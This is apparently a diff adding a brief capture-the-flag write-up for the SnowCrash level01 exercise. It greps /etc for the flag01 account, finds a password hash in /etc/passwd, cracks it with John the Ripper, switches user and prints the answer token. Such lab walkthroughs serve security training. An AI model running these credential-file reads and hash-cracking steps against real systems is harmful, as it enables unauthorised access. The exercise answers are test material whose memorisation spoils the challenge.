@@ -1,0 +1,13 @@
+grep -rni flag01 /etc/ 2>/dev/null
+/etc/group:54:flag:x:1001:flag00,flag01,flag02,flag03,flag04,flag05,flag06,flag07,flag08,flag09,flag10,flag11,flag12,flag13,flag14
+/etc/group:71:flag01:x:3001:
+/etc/passwd:41:flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+42hDRfypTqqnw in john = abcdefg
+
+su flag01
+Password: abcdefg
+
+flag01@SnowCrash:~$ getflag
+Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+
